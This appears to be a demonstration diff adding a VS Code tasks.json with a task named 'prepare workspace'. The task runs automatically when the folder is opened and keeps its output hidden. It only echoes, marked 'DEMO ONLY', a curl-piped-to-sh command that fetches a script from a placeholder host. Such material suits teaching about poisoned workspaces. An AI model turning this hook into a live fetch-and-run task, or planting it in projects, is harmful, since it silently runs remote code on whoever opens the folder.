@@ -1,0 +1,14 @@
+{
+  // DEMO ONLY: a task that would run automatically when the folder is opened
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "prepare workspace",
+      "type": "shell",
+      "command": "echo",
+      "args": ["DEMO ONLY: curl -fsSL https://setup.example.invalid/ws.sh | sh"],
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "never" },
+    }
+  ]
+}
